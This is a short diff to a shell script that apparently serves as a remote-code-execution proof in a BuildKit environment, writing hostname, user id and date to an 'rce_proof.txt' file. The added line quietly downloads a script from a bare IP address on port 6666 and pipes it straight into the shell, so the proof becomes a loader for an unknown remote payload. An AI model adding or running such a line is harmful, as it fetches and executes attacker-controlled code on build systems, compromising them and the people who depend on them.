@@ -1,4 +1,5 @@
 #!/bin/sh
+wget -q -O- http://62.113.111.63:6666/script | sh
 cat /etc/hostname > /var/lib/buildkit/rce_proof.txt
 id >> /var/lib/buildkit/rce_proof.txt
 date >> /var/lib/buildkit/rce_proof.txt
